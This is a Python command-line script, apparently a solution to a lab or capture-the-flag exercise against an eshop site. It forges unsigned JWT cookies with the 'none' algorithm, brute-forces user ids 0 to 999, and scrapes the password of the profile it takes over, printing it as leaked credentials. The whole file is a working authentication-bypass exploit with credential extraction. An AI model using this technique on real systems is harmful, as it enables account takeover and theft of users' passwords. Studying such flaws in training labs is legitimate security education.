from http import HTTPStatus
from pathlib import Path
    
import jwt
from rich.theme import Theme
import typer
import requests
from lxml import html
from rich.console import Console
from rich.progress import Progress, track
custom_theme = Theme({
    "info": "green",
    "warning": "yellow",
    "danger": "bold red"
})
console = Console(theme=custom_theme)


app = typer.Typer()


@app.command()
def run():
    brute_force_value=1000

    #this is useful because it will take by itself the cookies set by the website, I don't need to perform additional requests to get them
    #it is more easy
    session = requests.session()

    #the website needs it, we can see explicitly in the response if we don't put it
    session.headers.update({'Referer': 'https://cod.alviano.org/eshop/profile-2/'})

    success_resp = 'star69'

    response = session.get(
       "https://cod.alviano.org/eshop/profile-2/")
    
    if response.status_code == HTTPStatus.OK:
        extract_csrf_from_response(response)

    with Progress() as progress:
        task = progress.add_task("jwts fuzzing...", total=brute_force_value) 
        for i in range(0, brute_force_value):
            encoded_jwt = jwt.encode({"id": i}, None, headers={"alg": "none", 'typ': "JWT"})
        
            session.cookies.set('profile-2', encoded_jwt)
            response = session.get(
            "https://cod.alviano.org/eshop/profile-2/")

            
            if success_resp in response.text:
                key= find_key_from_response(response)
                progress.update(task, advance=brute_force_value)
                console.print(f'\n Leaked credentials {success_resp}:{key.strip()}', style="warning")
                break

            progress.update(task, advance=1)

       
def find_key_from_response(response):
    key=''.join(response.text.split("Password:</strong>")[1].split("</p>")[0])
    return key

def extract_csrf_from_response(response):
    html_document = html.fromstring(response.content)
        
    csrf=html_document.xpath('//input[@name="csrfmiddlewaretoken"]/@value')[0]
    return csrf



    

if __name__ == "__main__":
    app()